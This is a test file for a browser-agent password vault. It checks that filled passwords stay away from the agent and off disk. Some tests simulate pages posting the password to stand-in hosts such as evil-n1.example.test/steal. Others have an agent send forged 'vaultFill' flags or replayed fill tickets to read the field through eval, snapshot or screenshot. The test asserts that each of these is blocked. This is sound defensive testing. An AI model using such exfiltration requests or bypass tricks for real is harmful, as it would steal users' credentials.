      const bobWinChg2 = (winListChg2.json?.entries || []).find((e) => e.name === bobName);
      const winConfirmChg = await reqJson('POST', '/api/vault/web-logins/confirm', { name: bobName, ...(bobWinChg2?.rev != null ? { rev: bobWinChg2.rev } : {}) }, ownerHdr);
      const fillPrev = await runCli(['fill', '#opw', '--vault', 'shop.example.test#bob/previous']);
      ok(bobWinChg2?.rev === bobPend3?.rev && (bobWinChg2?.rev ?? 0) >= 4 && winConfirmChg.status === 200 && winConfirmChg.json?.confirmed === true
        && fillPrev.code === 0 && fk.readDomValues(tid).opw === PW_BOB_1,
        'L2 + RULING 1: Vault-window Confirm ({name, rev}) on rev>=2 change promotes candidate -> current and rotates old current -> `/previous`');

      // L2: Re-registration after loginRevFloor rise (`rev >= 2`) confirmed via Vault-window `{ name, rev: entry.rev }` + For-you card Confirm leg!
      const reregName = BL.entryName('https://shop.example.test', 'rereg');
      await runCli(['fill', '#npw', '--vault', 'new:shop.example.test#rereg/password', '--generate']);
      const PW_REREG_1 = BL.recordOf(eng.secretGet(reregName).value.toString('utf8'))?.pending?.password || '';
      const winRereg1 = (await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr)).json?.entries?.find((e) => e.name === reregName);
      const discRereg1 = await reqJson('POST', '/api/vault/web-logins/discard', { name: reregName, rev: winRereg1?.rev }, ownerHdr);
      await runCli(['fill', '#npw', '--vault', 'new:shop.example.test#rereg/password', '--generate']);
      const reregRec2 = BL.recordOf(eng.secretGet(reregName).value.toString('utf8'));
      const PW_REREG_2 = reregRec2?.pending?.password || '';
      const winRereg2 = (await reqJson('GET', '/api/vault/web-logins', undefined, ownerHdr)).json?.entries?.find((e) => e.name === reregName);
      const confRereg2 = await reqJson('POST', '/api/vault/web-logins/confirm', { name: reregName, rev: winRereg2?.rev }, ownerHdr);
      ok(discRereg1.status === 200 && winRereg2?.rev === reregRec2?.rev && (winRereg2?.rev ?? 0) >= 2 && confRereg2.status === 200,
        'L2: re-registration after floor rise (rev>=2) exposes exact rev in /api/vault/web-logins and confirms cleanly via Vault-window {name, rev}',
        { reregRev: winRereg2?.rev, confStatus: confRereg2.status });

      // L3: End-to-end custom-kernel owner takeover `VibeSpace.credentialSubmitted` (`usernameHint` -> `offerOwnerSaveCard`) + malformed drop notice!
      const PW_TAKEOVER = 'HumanTyped!' + crypto.randomBytes(5).toString('hex');
      isTakeover = true;
      const cardsBeforeL3 = [...fyItems.values()].filter((x) => x.status === 'open' && x.action?.type === 'save-login' && !x.action?.pending).length;
      fk.submitCredentialForm({ targetId: tid, origin: 'https://shop.example.test', usernameHint: 'human1', password: PW_TAKEOVER, outcome: 'navigated' });
      for (let i = 0; i < 30 && [...fyItems.values()].filter((x) => x.status === 'open' && x.action?.type === 'save-login' && !x.action?.pending).length === cardsBeforeL3; i++) {
        await new Promise((r) => setTimeout(r, 10));
      }
      const tkCardItem = [...fyItems.values()].find((x) => x.status === 'open' && x.action?.type === 'save-login' && !x.action?.pending);
      const tkCard = tkCardItem ? logins.cardOf(tkCardItem.action.id) : null;

      // Missing `usernameHint` during takeover -> journal log + `takeover-save-dropped` For-you notice (never silent!)
      fk.submitCredentialForm({ targetId: tid, origin: 'https://shop.example.test', usernameHint: '', password: PW_TAKEOVER, outcome: 'navigated' });
      for (let i = 0; i < 30 && ![...fyItems.values()].some((x) => x.kind === 'notice' && /was not offered to the vault/.test(x.text || '')); i++) {
        await new Promise((r) => setTimeout(r, 10));
      }
      isTakeover = false;
      const dropNotices = [...fyItems.values()].filter((x) => x.kind === 'notice' && /was not offered to the vault/.test(x.text || ''));
      ok(Boolean(tkCard) && dropNotices.length === 1 && hubLogs.some((l) => /save-login card refused|takeover save-login card not offered/.test(l)),
        'L3: kernel credentialSubmitted(usernameHint) during owner takeover files save-login For-you card; missing usernameHint logs warning and files 1 takeover-save-dropped notice',
        { hasCard: Boolean(tkCard), dropNotices: dropNotices.length });

      if (tkCard) {
        const agCardTry = await reqJson('POST', `/api/browser/logins/cards/${tkCard.id}/approve`, { shown: tkCard.shown }, agentHdr);
        ok(agCardTry.status === 403 && agCardTry.json?.code === 'agent_forbidden', 'the save-login card route refuses an agent bearer (403 agent_forbidden)');
        const staleCardTry = await reqJson('POST', `/api/browser/logins/cards/${tkCard.id}/approve`, { shown: '0000000000000000' }, ownerHdr);
        ok(staleCardTry.status === 409 && staleCardTry.json?.code === 'card_changed' && !eng.hasEntry(BL.entryName('https://shop.example.test', 'human1')),
          'a card answered with another digest is refused card_changed and saves nothing');
        const okCardTry = await reqJson('POST', `/api/browser/logins/cards/${tkCard.id}/approve`, { shown: tkCard.shown }, ownerHdr);
        ok(okCardTry.status === 200 && okCardTry.json?.saved === true && eng.hasEntry(BL.entryName('https://shop.example.test', 'human1')),
          'owner answering takeover save-login card with matching digest seals login');
      }

      // Locked-boot `answerCard` => `vault_locked`
      await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/noop', postData: 'x=1', finish: true });
      await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
      watch.shutdown();
      eng.lock();
      const loginsLockedBoot = Lm.create({ vault: eng, grants: () => grants, forYou, now: () => clock, log: () => {} });
      const lockedCardAns = loginsLockedBoot.answerCard('sl-deadbeef', { approve: true, shown: '0123456789abcdef', who: 'owner' });
      ok(!lockedCardAns.ok && lockedCardAns.code === 'vault_locked',
        'after locked hub restart, answering a pending/save-login card returns vault_locked (never card_gone)', lockedCardAns);
      await eng.unlock(VPW);

      // Ruling 5c / RULE 5′: 51+ needle byte scan across entire data/ tree
      const allSecrets = [VPW, PW_ALICE, PW_BOB_1, PW_BOB_2, PW_BOB_3, PW_REREG_1, PW_REREG_2, PW_TAKEOVER];
      const diskHits = [];
      for (const f of walkFiles(DATA)) {
        const raw = fs.readFileSync(f, 'utf8');
        const rel = path.relative(DATA, f);
        for (const s of allSecrets) {
          for (const ndl of secretNeedles(s)) {
            if (raw.includes(ndl)) diskHits.push(`${rel}:${ndl.slice(0, 12)}`);
          }
        }
      }
      ok(diskHits.length === 0, `RULING 5c / RULE 5′: zero raw/encoded/sha256/sha1/sha512 secret traces across ${walkFiles(DATA).length} files in data/ (${allSecrets.length * 17} needles)`, diskHits);

      // ── r24/r25 FAST LEGS: m3 (parallel verbRunning via server ticket), A2 (forged vaultFill/fillTicket), m4, m1, N4 ──
      // m3: parallel verbRunning counter stays balanced (`started: true` on server-ticketed `/resolve` pairs 1-to-1 with `/audit` `ended: true`)
      {
        while (watch.verbRunning(KEY)) watch.verbEnded(KEY, { profileId: PID });
        const idleBefore = watch.verbRunning(KEY);
        const resWait = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['wait', '5000'], wrapper: true }, agentHdr);
        const runningBeforeFill = watch.verbRunning(KEY);
        const prepVf = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const resVf = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#npw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: prepVf.json?.fillTicket }, agentHdr);
        const audVf = await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'fill', ok: true, since: resVf.json?.at || 1 }, agentHdr);
        const runningAfterFill = watch.verbRunning(KEY);
        const audWait = await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'wait', ok: true, since: resWait.json?.at || 1 }, agentHdr);
        const runningAfterWait = watch.verbRunning(KEY);
        ok(idleBefore === false && resWait.status === 200 && prepVf.status === 200 && resVf.status === 200 && !('cdpUrl' in (resVf.json || {}))
          && runningBeforeFill === true && audVf.status === 200 && runningAfterFill === true && audWait.status === 200 && runningAfterWait === false,
          'm3 + A2: parallel verb stays verbRunning()===true after server-ticketed fill --vault /resolve (no cdpUrl) + /audit, then drops to false when parallel verb finishes',
          { idleBefore, runningBeforeFill, runningAfterFill, runningAfterWait, vfKeys: Object.keys(resVf.json || {}) });
      }

      // A2: Request-body flags (`vaultFill: true`, forged `fillTicket`, or a real `fillTicket` replayed on another argv) NEVER bypass `liveFillRefusal`, `scrubOutput`, or `checkActiveTabFence`!
      {
        // Note: `#npw` currently holds `PW_ALICE` on `tid` (`https://shop.example.test/login` — let's make sure a live fill is armed on `tid`)
        fk.setDom(tid, { url: 'https://shop.example.test/login', elements: [{ id: 'npw', tag: 'input', type: 'password', name: 'Password' }] });
        await watch.arm(PID);
        const fillLive = await runCli(['fill', '#npw', '--vault', 'shop.example.test#alice/password']);
        const fgEval = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', 'document.querySelector("#npw").value'], wrapper: true, vaultFill: true }, agentHdr);
        const fgGet = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['get', 'value', '#npw'], wrapper: true, vaultFill: true }, agentHdr);
        const fgSnap = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['snapshot'], wrapper: true, vaultFill: true }, agentHdr);
        const fgShot = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['screenshot'], wrapper: true, vaultFill: true }, agentHdr);
        const realPrep = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const swapEval = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['eval', 'document.querySelector("#npw").value'], wrapper: true, fillTicket: realPrep.json?.fillTicket }, agentHdr);
        const realPrepArgv = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const swapClick = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '#other'], wrapper: true, fillTicket: realPrepArgv.json?.fillTicket }, agentHdr);
        const realPrepConsume = await reqJson('POST', '/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#npw', spec: 'shop.example.test#alice/password' }, agentHdr);
        const validFill = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#npw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: realPrepConsume.json?.fillTicket }, agentHdr);
        const replayFill = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#npw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: realPrepConsume.json?.fillTicket }, agentHdr);
        const clickWithForgedFlag = await reqJson('POST', '/api/agent/browser/resolve', { handle: 'shop', argv: ['click', '#npw'], wrapper: true, vaultFill: true }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'click', ok: true, since: swapClick.json?.at || 1 }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'fill', ok: true, since: validFill.json?.at || 1 }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'fill', ok: true, since: replayFill.json?.at || 1 }, agentHdr);
        await reqJson('POST', '/api/agent/browser/audit', { profile: PID, verb: 'click', ok: true, since: clickWithForgedFlag.json?.at || 1 }, agentHdr);
        ok(fillLive.code === 0
          && fgEval.status === 409 && fgEval.json?.code === 'login_fill_live'
          && fgGet.status === 409 && fgGet.json?.code === 'login_fill_live'
          && fgSnap.status === 409 && fgSnap.json?.code === 'login_fill_live'
          && fgShot.status === 409 && fgShot.json?.code === 'login_fill_live'
          && swapEval.status === 409 && swapEval.json?.code === 'login_fill_live'
          && swapClick.status === 200 && Boolean(swapClick.json?.socketDir)
          && validFill.status === 200 && !('socketDir' in (validFill.json || {})) && !('cdpUrl' in (validFill.json || {}))
          && replayFill.status === 200 && Boolean(replayFill.json?.socketDir)
          && clickWithForgedFlag.status === 200 && clickWithForgedFlag.json?.scrubOutput === true,
          'A2 + r26: forged vaultFill:true and argv-swapped fillTicket on eval/get/snapshot/screenshot return 409; argv-swapped fillTicket on click is NOT accepted as server fill (retains socketDir); matching fill consumes ticket once; scrubOutput stays true',
          { fgEval: fgEval.status, swapEval: swapEval.status, swapClickSocketDir: Boolean(swapClick.json?.socketDir), validNoSocketDir: !('socketDir' in (validFill.json || {})), replaySocketDir: Boolean(replayFill.json?.socketDir), scrubOutput: clickWithForgedFlag.json?.scrubOutput });
      }

      // m4 route precheck (`tabOrigin: ''` -> `http://localhost:<port>` entry resolved with 0 false `login_no_entry` or `login_bad_origin`)
      {
        const lhPort = await deadPort();
        const lhOrigin = `http://localhost:${lhPort}`;
        logins.addOwn({ origin: lhOrigin, username: 'localdev', password: 'LocalDev!Password99' }, { who: 'owner' });
        logins.grant(`web-login:${lhOrigin}#localdev`, 'this-account', `session:${CID}`);
        const preLh = watch.precheckVaultFill({
          target: '#pw',
          spec: `localhost:${lhPort}#localdev/password`,
          facts: { conversationKeys: [CID] },
          profileId: PID,
        });
        ok(Boolean(preLh && preLh.ok && preLh.origin === lhOrigin),
          'm4: precheckVaultFill resolves bare localhost:<port>#user/password against saved http://localhost:<port> entry',
          preLh);
      }

      // m1: custom-kernel `http-auth` surface never promises `fill @ref --vault` or retired `vibespace-browser login`
      {
        const SF = require(path.join(REPO, 'src/browser-surfaces.js'));
        const manualTxt = fs.readFileSync(path.join(REPO, 'docs/agent/browser-manual.md'), 'utf8');
        const httpSurf = fk.openSurface({
          targetId: tid,
          kind: 'http-auth',
          origin: 'https://shop.example.test',
          title: 'Sign in',
          fields: [{ fieldId: 'u', type: 'text', label: 'Username', required: true }, { fieldId: 'p', type: 'password', label: 'Password', required: true }],
          answers: [{ id: 'sign-in', label: 'Sign in', kind: 'credential' }, { id: 'cancel', label: 'Cancel', kind: 'dismiss' }],
        });
        await new Promise((r) => setTimeout(r, 20));
        const stood = watch.surfacesIn(PID)?.find((s) => s.id === httpSurf.surfaceId) || null;
        const stxt = stood ? SF.surfaceText(stood, { now: clock }) : '';
        fk.closeSurface(httpSurf.surfaceId, { how: 'dismissed', by: 'page' });
        const httpManualLine = manualTxt.split('\n').find((l) => l.includes('**An HTTP sign-in**')) || '';
        ok(Boolean(stood && !stood.logins && !/fill @ref --vault/.test(stxt) && /Only the user can pick/.test(stxt))
          && !/vibespace-browser login\b/.test(httpManualLine) && /only the user can answer it/i.test(httpManualLine),
          'm1: custom-kernel http-auth surface and browser-manual never promise fill --vault or retired login, directing agent to user / cancel',
          { stoodLogins: stood?.logins, stxt, httpManualLine });
      }

      // N4: PURE + fake-kernel scan-limit fail-closed matrix (all 7 caps: cross-origin blocked + 1 notice, same-origin allowed)
      if (typeof Dm.inspectRequestBody === 'function' && Dm.SCAN_LIMITS) {
        const sigsN4 = [Dm.credSigOf(PW_ALICE)];
        const capCases = [
          ['string_too_long', 'application/json', JSON.stringify({ pad: 'a'.repeat(Dm.SCAN_LIMITS.maxStringChars + 5) })],
          ['json_too_many_nodes', 'application/json', JSON.stringify(Array.from({ length: Dm.SCAN_LIMITS.maxJsonNodes + 5 }, () => 0))],
          ['nested_json_too_many_nodes', 'application/json', JSON.stringify({ inner: JSON.stringify(Array.from({ length: Dm.SCAN_LIMITS.maxNestedJsonNodes + 5 }, () => 0)) })],
          ['text_too_many_lines', 'text/plain', Array.from({ length: Dm.SCAN_LIMITS.maxTextLines + 5 }, () => 'k=v').join('\n')],
          ['multipart_too_many_parts', 'multipart/form-data; boundary=capBnd', Array.from({ length: Dm.SCAN_LIMITS.maxMultipartParts + 2 }, (_, i) => `--capBnd\r\nContent-Disposition: form-data; name="f${i}"\r\n\r\nv\r\n`).join('') + '--capBnd--\r\n'],
          ['too_many_base64_tokens', 'text/plain', Array.from({ length: Dm.SCAN_LIMITS.maxB64Tokens + 2 }, () => 'YWJjZGVm').join(' ')],
          ['body_too_large', 'text/plain', 'z'.repeat(Dm.SCAN_LIMITS.maxBodyBytes + 16)],
        ];
        const pureBad = [];
        for (const [wantReason, ct, body] of capCases) {
          const ir = Dm.inspectRequestBody(body, sigsN4, ct, { hasPostData: true });
          if (ir.carries !== false || ir.undecodable !== true || ir.reason !== wantReason) {
            pureBad.push({ wantReason, got: ir });
          }
        }
        ok(pureBad.length === 0, 'N4 (PURE): all 7 scan caps return { carries: false, undecodable: true, reason } instead of failing open', pureBad);

        // Drive all 7 scan caps over the live watch (`tid` has `PW_ALICE` live from earlier fill): cross-origin blocked + 1 notice, same-origin continues
        const xoBeforeCaps = [...fyItems.values()].filter((x) => x.kind === 'notice' && /Blocked a cross-origin request/.test(x.text || '')).length;
        const capWireBad = [];
        for (const [wantReason, ct, body] of capCases) {
          const xo = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://cap-evil.example.test/drop', headers: { 'content-type': ct }, postData: body, finish: false });
          const so = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://shop.example.test/api/harmless-large', headers: { 'content-type': ct }, postData: body, finish: false });
          if (xo.action !== 'fail' || xo.errorReason !== 'BlockedByClient' || so.action !== 'continue') {
            capWireBad.push({ wantReason, xo, so });
          }
        }
        const xoAfterCaps = [...fyItems.values()].filter((x) => x.kind === 'notice' && /Blocked a cross-origin request/.test(x.text || '')).length;
        ok(capWireBad.length === 0 && (xoAfterCaps - xoBeforeCaps) === 1,
          'N4 (fake kernel): all 7 scan caps block cross-origin with BlockedByClient + 1 dedup notice while allowing same-origin',
          { capWireBad, noticeDelta: xoAfterCaps - xoBeforeCaps });
      }
    }
  } finally {
    watch.shutdown();
    try { srv.close(); } catch {}
    await fk.close();
    LF?.clearAllFilledSecrets?.();
    eng.close();
    fs.rmSync(ROOT4, { recursive: true, force: true });
  }
}

// ═══ ④b r24 DEDICATED FAKE-KERNEL PROOFS: N1 (hold + mode-flip) + m2 (Network.disable) + N2 (3000-row AX) + N5 (6 attacks) ═══
console.log('④b r24 fake-kernel proofs: N1 hold/mode-flip Fetch · m2 Network.disable · N2 3000-row on-demand queryAXTree · N5 post-prepare attacks');
if (typeof LF?.resolveSnapshotRef === 'function' && Dm.SCAN_LIMITS) {
  const ROOT4B = scratch('vl-r24-proofs');
  fs.rmSync(ROOT4B, { recursive: true, force: true });
  fs.mkdirSync(ROOT4B, { recursive: true });
  const fkStd = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
  const engB = VE.create({ dataDir: ROOT4B, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
  await engB.setup('R24Proof#Master9');
  try {
    const gB = GS.create({ memory: true });
    const fyB = [];
    const logB = Lm.create({
      vault: engB, grants: () => gB, log: () => {},
      forYou: { add: (_pid, it) => { fyB.push(it); return `fy-${fyB.length}`; }, resolve() {} },
    });
    const PW_N1 = 'N1HoldSecret!' + crypto.randomBytes(4).toString('hex');
    logB.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_N1 }, { who: 'owner' });
    logB.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-r24');

    let holdersB = [{ browserKey: 'bk-r24', sessionId: 's-r24' }];
    const skB = {
      cdpEndpointFor: async () => ({ ok: true, url: fkStd.wsUrl }),
      onLease: () => () => {},
      saveLoginFenceState() {},
      loginFenceStateOf: () => null,
      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkStd.wsUrl), action }),
    };
    const wEvents = [];
    const wB = Dm.create({
      keeper: skB,
      log: quiet,
      enableTimeoutMs: 400,
      holdersOf: () => holdersB,
      leaseCountOf: () => holdersB.filter((h) => !h.human).length,
      logins: logB,
      forYou: { add: (_pid, it) => { fyB.push(it); return `fy-${fyB.length}`; }, resolve() {} },
      wipeMaxScanPositions: 1024,
      axMaxPayloadBytes: 4 * 1024 * 1024,
    });
    wB.onChange((ev) => wEvents.push(ev));
    await wB.arm('bp-r24');
    const tidB = fkStd.targets()[0].targetId;

    // 1. N1 (standard Chrome mode): hold state (`tooMuchText`) keeps '*' Request interception up and blocks foreign XHR/fetch!
    fkStd.setDom(tidB, {
      url: 'https://shop.example.test/login',
      elements: [
        { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
        { id: 'big', tag: 'textarea', type: 'textarea', name: 'Notes', value: 'x'.repeat(2400) },
      ],
    });
    wB.noteActiveTab({ profileId: 'bp-r24', browserKey: 'bk-r24' }, tidB);
    const fillHold = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const preHoldEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-n1.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch', finish: true });
    for (let i = 0; i < 30; i++) {
      const lv = wB.liveFillVerdictFor({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { verb: 'eval', argv: ['eval', '1'] });
      if (lv && /too much text/i.test(lv.error || lv.reason || '')) break;
      await new Promise((r) => setTimeout(r, 10));
    }
    const lvHold = wB.liveFillVerdictFor({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { verb: 'eval', argv: ['eval', '1'] });
    const postHoldEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-n1b.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    const holdXoNotices = fyB.filter((it) => it.kind === 'notice' && /Blocked a cross-origin request/.test(it.text || ''));
    ok(Boolean(fillHold?.ok) && preHoldEvil.action === 'fail' && !lvHold.ok && /too much text/i.test(lvHold.error || '')
      && postHoldEvil.action === 'fail' && postHoldEvil.errorReason === 'BlockedByClient' && holdXoNotices.length === 2,
      'N1 (standard Chrome mode): after wipe enters holdReason=tooMuchText, foreign Fetch/XHR is STILL BlockedByClient + 1 notice per destination',
      { preHoldEvil, lvHold, postHoldEvil, notices: holdXoNotices.length });

    // 2. N1 mode flip (`agent -> person -> agent`) while fence is live + second fill afterwards
    holdersB = [{ browserKey: 'bk-human', human: true, input: 'user' }];
    await wB.arm('bp-r24');
    await new Promise((r) => setTimeout(r, 25));
    const personEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-person.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    holdersB = [{ browserKey: 'bk-r24', sessionId: 's-r24' }];
    await wB.arm('bp-r24');
    await new Promise((r) => setTimeout(r, 25));
    const backAgentEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-agent.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    // Navigate away to clear the tooMuchText hold (which also sends Network.disable #1), then refill on clean DOM -> testing m2 Network.disable on same-origin wipe!
    const markBeforeNav = fkStd.mark();
    fkStd.navigate(tidB, 'https://shop.example.test/login');
    await new Promise((r) => setTimeout(r, 25));
    const navNetDisables = fkStd.calls().filter((c) => c.seq > markBeforeNav && c.method === 'Network.disable').length;
    fkStd.setDom(tidB, {
      url: 'https://shop.example.test/login',
      elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }],
    });
    const refillAfterFlip = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const afterRefillEvil = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://evil-refill.example.test/steal', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch' });
    ok(personEvil.action === 'fail' && backAgentEvil.action === 'fail' && navNetDisables >= 1 && Boolean(refillAfterFlip?.ok) && afterRefillEvil.action === 'fail',
      'N1: agent -> person -> agent mode flip keeps * Fetch interception synced and blocks foreign POSTs before, during, and after refill',
      { personEvil, backAgentEvil, navNetDisables, refillAfterFlip: refillAfterFlip?.ok, afterRefillEvil });

    // 3. m2: once same-origin submit wipes and lifts the fence, `Network.disable` runs and 0 `Network.*` events reach hub
    const markBeforeLift = fkStd.mark();
    await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_N1)}`, resourceType: 'Fetch', finish: true });
    // (B-518e, also — the gate's red on 5e3f0cd26 and earlier: a 40 × 10 ms limit on the lift. The lift is waited for by the facts
    // the leg reads: the fence gone (the verdict ok), Network.disable sent, and the tab's Fetch mode back off the credential
    // patterns (the tab's own state) — asked a bounded COUNT of times; the bound only ends a wait that never comes)
    const tabB = () => { const w = wB._watches && wB._watches.get('bp-r24'); return w ? [...w.targets.values()].find((x) => x && String(x.targetId).toUpperCase() === String(tidB).toUpperCase()) || null : null; };
    let m2Settled = false;
    for (let i = 0; i < 600 && !m2Settled; i++) {
      m2Settled = wB.liveFillVerdictFor({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { verb: 'eval', argv: ['eval', '1'] }).ok
        && fkStd.calls().some((c) => c.seq > markBeforeLift && c.method === 'Network.disable')
        && Boolean(tabB()) && !tabB().credNetEnabled && !/^all-/.test(String(tabB().fetchMode || ''));
      if (!m2Settled) await new Promise((r) => setTimeout(r, 10));
    }
    const netDisableCalls = fkStd.calls().filter((c) => c.seq > markBeforeLift && c.method === 'Network.disable');
    const rawCheck = await fkStd.simulateSubmitRequest({ targetId: tidB, url: 'https://shop.example.test/api/poll', postData: 'ping=1', resourceType: 'Fetch', finish: true });
    await new Promise((r) => setTimeout(r, 20));
    ok(m2Settled && netDisableCalls.length >= 1 && rawCheck.action === 'unwatched',
      'm2: lifting the live-fill fence sends Network.disable and restores Document-only Fetch (subsequent XHR unwatched, 0 Network.* events)',
      { m2Settled, netDisables: netDisableCalls.length, fetchMode: tabB() && tabB().fetchMode, rawCheck });

    // 4. N2: 3,000-row page (`axPadBytes: 6000` => `getFullAXTree` would be > 18 MiB > 16 MiB watch maxPayload!)
    const rows3000 = [];
    const snapLines3000 = [];
    for (let i = 0; i < 3000; i++) {
      rows3000.push({ id: `r${i}`, tag: 'input', type: 'text', name: `row ${i}` });
      snapLines3000.push({ ref: `@e${i + 1}`, role: 'textbox', name: `row ${i}`, nth: 0 });
    }
    rows3000.push({ id: 'lpw', tag: 'input', type: 'password', name: 'Password' });
    snapLines3000.push({ ref: '@e3001', role: 'textbox', name: 'Password', nth: 0 });
    fkStd.setDom(tidB, { url: 'https://shop.example.test/big-table', elements: rows3000, axPadBytes: 6000 });
    const axMark0 = fkStd.mark();
    const downBeforeSnap = wEvents.filter((x) => x.kind === 'down').length;
    const ns3000 = await wB.noteSnapshot({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { parsedRefs: snapLines3000, targetId: tidB });
    const allCallsOnSnap = fkStd.calls().filter((c) => c.seq > axMark0);
    const axCallsOnSnap = allCallsOnSnap.filter((c) => /^Accessibility\./.test(c.method));
    const downAfterSnap = wEvents.filter((x) => x.kind === 'down').length;
    ok(Boolean(ns3000?.ok) && ns3000.count === 3001 && allCallsOnSnap.length === 0 && axCallsOnSnap.length === 0 && downAfterSnap === downBeforeSnap,
      'N2: snapshot on 3,000-row page makes 0 CDP / Accessibility.* calls and keeps watch open',
      { cdpCalls: allCallsOnSnap.length, axCalls: axCallsOnSnap.length, downDelta: downAfterSnap - downBeforeSnap });

    // Fill `@e3001` on that 3,000-row page -> bounded `Accessibility.queryAXTree` resolves `@e3001` (~6 KiB), 0 `getFullAXTree`, watch stays open!
    const axMark1 = fkStd.mark();
    const fill3000 = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      target: '@e3001', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const callsOnFill = fkStd.calls().filter((c) => c.seq > axMark1);
    const fullAxOnFill = callsOnFill.filter((c) => c.method === 'Accessibility.getFullAXTree');
    const queryAxOnFill = callsOnFill.filter((c) => c.method === 'Accessibility.queryAXTree');
    const downAfterFill = wEvents.filter((x) => x.kind === 'down').length;
    ok(Boolean(fill3000?.ok) && fkStd.readDomValues(tidB).lpw === PW_N1 && fullAxOnFill.length === 0 && queryAxOnFill.length === 1 && downAfterFill === downBeforeSnap,
      'N2: fill @e3001 --vault on 3,000-row page uses 1 bounded queryAXTree call (0 getFullAXTree), fills password, and keeps watch open',
      { fullAxOnFill: fullAxOnFill.length, queryAxOnFill: queryAxOnFill.length, downDelta: downAfterFill - downBeforeSnap });

    // Oversize AX reply (> 4 MiB on 3,000 unlabelled textboxes with `axPadBytes: 2000`) -> `target_not_found` naming limit, watch STILL open!
    fkStd.navigate(tidB, 'https://shop.example.test/unlabelled-huge');
    await new Promise((r) => setTimeout(r, 15));
    const unlabelled3000 = Array.from({ length: 3000 }, (_, i) => ({ id: `u${i}`, tag: 'input', type: 'password', name: '' }));
    fkStd.setDom(tidB, { url: 'https://shop.example.test/unlabelled-huge', elements: unlabelled3000, axPadBytes: 2000 });
    await wB.noteSnapshot({ profileId: 'bp-r24', browserKey: 'bk-r24' }, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: '', nth: 0 }], targetId: tidB });
    const fillOversize = await wB.fillVaultField({ profileId: 'bp-r24', browserKey: 'bk-r24' }, {
      target: '@e1', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-r24'] },
    });
    const downAfterOversize = wEvents.filter((x) => x.kind === 'down').length;
    ok(!fillOversize.ok && fillOversize.code === 'target_not_found' && /limit|MiB/i.test(fillOversize.error || '') && downAfterOversize === downBeforeSnap,
      'N2: > 4 MiB AX reply on dedicated socket refuses target_not_found naming the safety limit and NEVER drops the watch socket',
      { fillOversize, downDelta: downAfterOversize - downBeforeSnap });

